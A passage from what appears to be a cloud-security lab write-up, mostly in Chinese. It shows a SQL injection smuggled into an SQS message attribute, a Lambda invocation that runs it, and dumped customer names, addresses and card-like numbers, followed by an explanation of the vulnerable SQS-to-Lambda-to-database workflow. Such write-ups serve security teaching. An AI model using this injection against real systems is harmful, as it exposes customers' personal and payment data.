aws sqs send-message --queue-url https://sqs.eu-north-1.amazonaws.com/254859366442/huge-analytics --message-attributes '{ "Weight": { "StringValue": "1337", "DataType":"Number"}, "Client": {"StringValue":"EY\" union select 1,clientName,address,cardUsed from customerData-- -", "DataType": "String"}, "trackingID": {"StringValue":"HLT1337", "DataType":"String"}}' --message-body "feng"

aws lambda invoke --function-name huge-logistics-stock --payload 'eyJERVNDIjoiSExUMTMzNyJ9' output

cat output
[{"trackingID": "HLT1300", "clientName": "EY", "packageWeight": "93", "delivered": "1"}, {"trackingID": "1", "clientName": "Adidas", "packageWeight": "56 Claremont Court", "delivered": "5133110655169130"}, {"trackingID": "1", "clientName": "EY", "packageWeight": "3 Farmco Parkway", "delivered": "4913444258211042"}, {"trackingID": "1", "clientName": "Google Inc.", "packageWeight": "559 Ohio Lane", "delivered": "3532085972424818"}, {"trackingID": "1", "clientName": "VELUS CORP.", "packageWeight": "e46fbfe64cf7e50be097005f2de8b227", "delivered": "3558615975963377"}]
```

所以目标的工作流程大概是这样：

1.  用户（或另一个系统组件）通过SQS消息发送数据（称为“有效负载”）。
2.  该消息暂时存储在SQS队列中，等待处理。
3.  Lambda 函数按计划或由其他事件触发，从 SQS 队列中读取此消息进行处理。
4.  作为此处理的一部分，来自 SQS 消息的数据用于与数据库交互，可能作为 SQL 查询的一部分。

即lambda每次从sqs队列中取出一个消息，如果该消息的trackingID是查询的ID，就会将消息的client作为查询语句中的where与数据库交互，将查询到的数据作为lambda的结果。

所以攻击流程不难，但是这种奇怪的工作流程很难想到。
